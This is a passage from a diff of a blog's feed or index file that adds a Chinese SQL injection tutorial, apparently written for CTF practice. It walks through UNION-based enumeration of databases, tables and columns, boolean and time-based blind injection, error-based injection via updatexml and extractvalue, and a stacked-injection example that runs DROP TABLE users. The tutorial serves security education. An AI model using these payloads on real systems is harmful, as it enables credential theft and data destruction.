+<li><code>database()</code>：当前数据库名</li>
+<li><code>version()</code>：当前使用的数据库版本</li>
+<li><code>@@datadir</code>：数据库存储数据路径</li>
+<li><code>concat()</code>：联合数据，用于联合两条数据结果。如 <code>concat(username,0x3a,password)</code></li>
+<li><code>group_concat()</code>：和 <code>concat()</code> 类似，如 <code>group_concat(DISTINCT+user,0x3a,password)</code>，用于把多条数据一次注入出来</li>
+<li><code>concat_ws()</code>：用法类似</li>
+<li><code>hex()</code> 和 <code>unhex()</code>：用于 hex 编码解码</li>
+<li><code>ASCII()</code>：返回字符的 ASCII 码值</li>
+<li><code>CHAR()</code>：把整数转换为对应的字符</li>
+<li><code>load_file()</code>：以文本方式读取文件，在 Windows 中，路径设置为 <code>\\</code></li>
+<li><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</li>
+</ul>
+<h3 id="基础注入类型"><a href="#基础注入类型" class="headerlink" title="基础注入类型"></a>基础注入类型</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>我们开局举的例子就是一个很典型的数字型注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</span><br></pre></td></tr></table></figure>
+
+<p>我们可用理解为两个部分 原有语句 <code>SELECT username,password FROM users WHERE id =</code>和用户输入部分<code>$_GET[&quot;id&quot;]</code>。</p>
+<p>前面我们说到，这种语句一般用于用户输入id来索引查询，所以预期的输入都是数字，所以直接采用的直接拼接的方式，以数字的方式进行查询。</p>
+<p>然而，用户的输入因为没有过滤的缘故，不管输入什么都会直接拼接到后面，所以我们可用用下面的步骤逐步得到数据库信息：</p>
+<ul>
+<li>使用 <code>Order by</code> 确定列数，方便后续注入。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 Order by 1;</span><br><span class="line">id = 1 Order by 2;</span><br><span class="line">id = 1 Order by 3; # 报错 确定列数为 2 </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用联合查询 <code>union</code> 基于 <code>information_schema</code> 拿到数据库名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union SELECT 1,schema_name FROM information_schema.schemata;</span><br><span class="line"># or</span><br><span class="line">1 union SELECT schema_name,2 FROM information_schema.schemata;</span><br><span class="line"># 注意这里的 schema_name 一定要放在会显示的列名上面 比如password不显示 但是username显示 那么就用第二种。</span><br><span class="line"># 此时后台执行为:</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union SELECT 1,schema_name FROM information_schema.schemata;</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://nssctf.wdf.ink//img/WDTJ/202304261957162.png" alt="image-20230426195745130"></p>
+<p> 也可以把1换成其他的，比如<code>database()</code> 这样我们可以知道我们当前在哪个数据库</p>
+<p> <img src="https://nssctf.wdf.ink//img/WDTJ/202304261959665.png" alt="image-20230426195952638"></p>
+<ul>
+<li>下面就是用联合查询得到数据库里面的表名，一般步骤我们都是先获取当前库 ( <code>database()</code> ) 的表，再去看其他库的。</li>
+</ul>
+<p>这里我们基于<code>UNION</code> <code>GROUP_CONCAT(table_name)</code> 和 <code>information_schema.tables</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line">1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()</span><br><span class="line"># 原理同上</span><br><span class="line"># 如果要查询其他数据库 可以写为 where table_schema=&#x27;databaseNAME&#x27;</span><br><span class="line"># 后台执行为：</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262013324.png" alt="image-20230426201306290"></p>
+<ul>
+<li>下面就是去获得 表 的对应字段名 方便我们最后一步的查询工作</li>
+</ul>
+<p>这里我们使用<code>UNION</code> <code>GROUP_CONCAT(column_name)</code> 和 <code>information_schema.columns</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database()</span><br><span class="line">1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database()</span><br><span class="line"># 后台执行为：</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262026058.png" alt="image-20230426202627021"></p>
+<h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>下面我们假设一个登录系统，那么他会接收两个参数 用户名和密码 后台的查询语句可能这样写</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;$username&#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>对于这种，开发时，预期数据收到的参数都为字符，使用字符进行查询的数据库的注入漏洞 我们称为字符型注入。</p>
+<p>与数字型不同的是，我们需要先构造单引号的闭合。</p>
+<p>这里我们让 <code>$username</code>&#x3D; <code>-1&#39; or &#39;1&#39;=&#39;1&#39; --</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; -- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262032468.png" alt="image-20230426203250434"></p>
+<p>就可以使<code>Where</code>的条件永真,直接输出<code>SELECT * FROM users</code>的所有内容。</p>
+<p>同样，与数字型的注入方式类似，我们也可以使用联合查询的方法来获取数据库信息。</p>
+<p><code>order by</code>判断列数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 1-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 2-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 3-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 4-- &#x27; AND password=&#x27;$password&#x27;; # 报错</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262132275.png" alt="image-20230426213252233"></p>
+<p>那么接下来就和数字型注入相同 吧 <code>order by NUM</code> 换成对应的语句即可：</p>
+<ul>
+<li>库名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union SELECT 1,schema_name,2 FROM information_schema.schemata;-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>表名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>- 字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database()-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注是指攻击者不能直接获取数据库中的信息，需要通过一些技巧来判断或推断出数据库中的数据。盲注主要分为布尔盲注和时间盲注两种。</p>
+<p>我们还是以下面的句子为例子，不过相比于之前的不同，我们规定用户的查询没有回显，所以仅靠上面的方式我们无法获得数据，所以我们选用盲注。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</span><br></pre></td></tr></table></figure>
+
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>对于上述语句，如果id的传参如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 AND 1=1</span><br></pre></td></tr></table></figure>
+
+<p>那么语句执行为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND 1=1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305041911785.png" alt="image-20230504191135714"></p>
+<p>这里会要求两个条件为真，一是有<code>id=1</code>这个值，二是 <code>1=1</code>，这两个条件当然是满足的，特别是后面的这个条件。</p>
+<p>那如果我让AND后面的条件为 <code>1 = 2</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND &#x27;1&#x27;=&#x27;2&#x27;;</span><br><span class="line"># 这里 &#x27;1&#x27; = &#x27;2&#x27;，1 = 2 效果都是一样的</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305041915652.png" alt="image-20230504191548610"></p>
+<p>可以看到返回为空，因为AND后面的条件不满足。</p>
+<p>那么利用这个AND符号我们可以尝试下面的一些方式来获取信息：</p>
+<ul>
+<li>使用 length(）获取长度信息</li>
+</ul>
+<p>比如，我们用 length(）函数去爆破数据长度</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 AND length(username)= NUM</span><br></pre></td></tr></table></figure>
+
+<p>那么语句执行为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND length(username)=1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305041921180.png" alt="image-20230504192130407"></p>
+<p>当然 枚举长度的方式效率属实难蚌，我们可以使用大于小于符号 基于二分算法进行爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 AND length(username)&lt; NUM</span><br><span class="line">id = 1 AND length(username)&gt; NUM</span><br></pre></td></tr></table></figure>
+
+<p>这样效率会高很多。</p>
+<ul>
+<li><code>SUBSTR()</code>函数用于截取字符串中的一部分。利用<code>SUBSTR()</code>函数，逐步截取数据库中的某个数据：</li>
+</ul>
+<p><code>SUBSTR(string, start, length)</code> 其中，<code>string</code>表示要截取的字符串，<code>start</code>表示截取的起始位置，<code>length</code>表示截取的长度。<code>SUBSTR()</code>函数会从字符串的<code>start</code>位置开始，截取指定长度的字符。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 AND SUBSTR(username,1,1) = &#x27;?&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>那么语句执行为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND SUBSTR(username,1,1) = &#x27;?&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305042115906.png" alt="image-20230504211550827"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND SUBSTR(username,2,1) = &#x27;d&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305042121944.png" alt="image-20230504212127894"></p>
+<p>通过前部分长度的获取，结合 <code>substr()</code> 就可以对一个具体的字符数据进行fuzz了。</p>
+<p>这里推荐编写脚本来完成这样繁琐的工作。</p>
+<p>除了上述用法 <code>SUBSTR()</code>函数还可以用于替换字符串中的某个字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE users SET username=SUBSTR(username,1,3)||&#x27;***&#x27;||SUBSTR(username,7) WHERE username=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>面的SQL语句的作用是将管理员账户的用户名中的第4到第6个字符替换为<code>***</code></p>
+<p>通过对该函数的组合使用，可以在不使用联合注入和依赖可视回显的方式拿到对应数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND SUBSTR((SELECT password FROM users WHERE username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>MID()</code>函数也是用于截取字符串的函数。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MID(string, start, length)</span><br><span class="line">MID(&quot;Hello, World!&quot;, 1, 5) # 返回的结果为&quot;Hello&quot;；</span><br><span class="line">SUBSTR(&quot;Hello, World!&quot;, 1, 5) # 返回的结果为&quot;Hello&quot;。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>CONCAT()</code></li>
+</ul>
+<p><code>CONCAT()</code>函数用于将多个字符串连接成一个字符串。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONCAT(string1, string2, ...)</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union select CONCAT(username,&#x27;-&#x27;,password),1 from users;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305042218959.png" alt="image-20230504221859903"></p>
+<p>而在盲注中，我们通常用其的连接功能减少查询跳转。</p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>其实和布尔差不多，只不过是利用SQL语句的执行时间来判断SQL语句的真假，从而逐步推断出数据库中的数据。</p>
+<p>下面是一些常用函数 和使用技巧：</p>
+<ul>
+<li><code>IF()</code></li>
+</ul>
+<p><code>IF()</code>函数是一种条件判断函数，它用于判断指定条件是否成立，并根据判断结果返回不同的值.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IF(condition, value_if_true, value_if_false)</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>condition</code>表示要判断的条件，<code>value_if_true</code>表示条件成立时要返回的值，<code>value_if_false</code>表示条件不成立时要返回的值。如果条件成立，<code>IF()</code>函数将返回<code>value_if_true</code>，否则将返回<code>value_if_false</code></p>
+<ul>
+<li><code>SLEEP()</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SLEEP()` 函数是时间盲注的核心，其语法为 `SLEEP(seconds)</span><br></pre></td></tr></table></figure>
+
+<p>当语句被执行时，程序将会暂停指定秒数，比如下面的例子：</p>
+<p>通常 <code>IF</code> 和 <code>SLEEP</code> 两函数会一起使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;admin&#x27; AND IF(SLEEP(5),1,0)</span><br></pre></td></tr></table></figure>
+
+<p>如果数据库中不存在用户名为<code>admin</code>的用户，那么该语句将会立即返回结束；否则，程序将会暂停5秒钟后再返回结果。</p>
+<p>同样我们使用我们的demo语句，<code>SELECT username,password FROM users WHERE id =</code>来演示：</p>
+<ul>
+<li>利用延时函数，如<code>SLEEP()</code>函数或者<code>BENCHMARK()</code>函数，来判断是否注入成功。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND IF(ASCII(SUBSTR(username,1,1))=97,SLEEP(5),0)</span><br></pre></td></tr></table></figure>
+
+<p>如果用户表中的第一个用户名字符为字母<code>a</code>，则程序会暂停5秒钟，否则返回0。</p>
+<ul>
+<li>利用时间戳</li>
+</ul>
+<p>可以利用数据库中的时间戳函数，如<code>UNIX_TIMESTAMP()</code>函数来构造延时语句，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND IF(UNIX_TIMESTAMP()&gt;1620264296,SLEEP(5),0)</span><br></pre></td></tr></table></figure>
+
+<p>上述SQL语句的意思是：如果当前时间戳大于<code>1620264296</code>，则程序会暂停5秒钟，否则返回0。</p>
+<ul>
+<li>利用函数返回值</li>
+</ul>
+<p>可以利用函数的返回值，如<code>LENGTH()</code>函数、<code>SUBSTR()</code>函数等，来判断是否注入成功。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND IF(LENGTH(username)=4,SLEEP(5),0)</span><br></pre></td></tr></table></figure>
+
+<p>上述SQL语句的意思是：如果用户名的长度为4，则程序会暂停5秒钟，否则返回0。</p>
+<ul>
+<li><code>BENCHMARK()</code></li>
+</ul>
+<p><code>BENCHMARK()</code>函数是一种用于重复执行指定语句的函数，在MySQL等数据库中支持使用。<code>BENCHMARK()</code>函数的语法通常如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>count</code>表示要重复执行的次数，<code>expr</code>表示要重复执行的语句。</p>
+<p>看这个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;admin&#x27; AND IF(BENCHMARK(10,MD5(&#x27;test&#x27;)),1,0)</span><br></pre></td></tr></table></figure>
+
+<p>如果数据库中不存在用户名为<code>admin</code>的用户，那么该语句将会立即返回；否则，程序将会重复执行<code>MD5(&#39;test&#39;)</code>函数10次后再返回结果</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>顾名思义，通过报错信息获取数据的方法。</p>
+<ul>
+<li><code>updatexml()</code></li>
+</ul>
+<p>这里我们先讲 <code>updatexml()</code> 报错注入。</p>
+<p><code>updatexml()</code> 是MySQL中的一种XML处理函数，它用于更新XML格式的数 据，其标准的用法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATEXML(xml_target, xpath_expr, new_value)</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>xml_target</code>是要更新的XML数据，<code>xpath_expr</code>是要更新的节点路 径，<code>new_value</code>是新的节点值。</p>
+<p>但是这个函数有一个缺陷，如果二个参数包含特殊符号时会报错，并且会第二 个参数的内容显示在报错信息中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE id = 1 and    updatexml(1, 0x7e, 3);</span><br><span class="line">1105 - XPATH syntax error: &#x27;~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>那么通过这个特性，我们用 <code>concat()</code> 函数 将查询语句和特殊符号拼接 在一起，就可以将查询结果显示在报错信息中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and updatexml(1, concat(0x7e,version()), 3) </span><br></pre></td></tr></table></figure>
+
+<p>输出:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE id = 1 and  updatexml(1, concat(0x7e,version()), 3);</span><br><span class="line">1105 - XPATH syntax error: &#x27;~8.0.12&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>不过要注意的是 <code>updatexml()</code> 的报错长度存在字符长度限制，目前有两 种方法来解决这个问题：</p>
+<ul>
+<li><code>LIMIT()</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and   updatexml(1,concat(0x7e,</span><br><span class="line">(select username from users </span><br><span class="line">limit 1,1)),</span><br><span class="line">3);</span><br><span class="line"># 不断改变limit NUM,1 的值逐行获取</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305050110708.png" alt="image-20230505011056626"></p>
+<ul>
+<li><p><code>substr()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e,</span><br><span class="line">substr(</span><br><span class="line">(select group_concat(username) from users),</span><br><span class="line">1,31)</span><br><span class="line">),3);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行结果：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e,</span><br><span class="line">substr(</span><br><span class="line">(select group_concat(username) from users),1,31)</span><br><span class="line">),3);</span><br><span class="line">1105 - XPATH syntax error: &#x27;~admin,super,flag,null&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>利用利用上述特性，我们可以下面的语句获取信息：</p>
+<p>获取所有数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,</span><br><span class="line">        substr( </span><br><span class="line">                (select group_concat(schema_name)</span><br><span class="line">                from information_schema.schemata)</span><br><span class="line">        , 1 , 31)</span><br><span class="line">),3)</span><br></pre></td></tr></table></figure>
+
+<p>获取所有表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,</span><br><span class="line">        substr( </span><br><span class="line">                (select group_concat(table_name)</span><br><span class="line">                from information_schema.tables</span><br><span class="line">                where table_schema = &#x27;security&#x27;)</span><br><span class="line">        , 1 , 31)</span><br><span class="line">),3)</span><br></pre></td></tr></table></figure>
+
+<p>获取所有字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,</span><br><span class="line">        substr( </span><br><span class="line">                (select group_concat(column_name)</span><br><span class="line">                from information_schema.columns</span><br><span class="line">                where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;)</span><br><span class="line">        , 1 , 31)</span><br><span class="line">),3)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>extractvalue()</code></li>
+</ul>
+<p><code>extractvalue()</code>是MySQL中的一个XML处理函数，它用于从XML格式的数据中提取指定节点的值。</p>
+<p>正常情况下他的语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXTRACTVALUE(xml_target, xpath_expr)</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>xml_target</code>是要提取节点值的XML数据，<code>xpath_expr</code>是要提取的节点路径。</p>
+<p>它用于报错注入的方法其实和 <code>updatexml()</code> 函数的使用方法差不多 但是参数少一个x</p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305050150790.png" alt="image-20230505015028726"></p>
+<p>而且报错信息长度限制也和<code>updatexml()</code> 一样，所以这里就不多做赘述。</p>
+<ul>
+<li><code>floor()</code></li>
+<li><code>exp()</code></li>
+</ul>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>顾名思义x 一堆 SQL语句(多条)一起执行方法被称为堆叠注入。</p>
+<p>其实讲原理就很容易懂：</p>
+<p>在执行SQL语句时，如果SQL语句中包含多个SQL语句，数据库服务器会依次执行这些SQL语句，从而导致多次SQL注入攻击。通过在SQL语句中使用分号（;）来分隔多个SQL语句，从而实现堆叠注入攻击。</p>
+<p>举个栗子：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id =1; DROP TABLE users;--</span><br></pre></td></tr></table></figure>
+
+<p>执行这个SQL语句时，数据库服务器会依次执行这两个SQL语句，将会查询到<code>users</code>表中的用户名和密码，并且将<code>users</code>表删除。</p>
+]]></content>
+      <tags>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
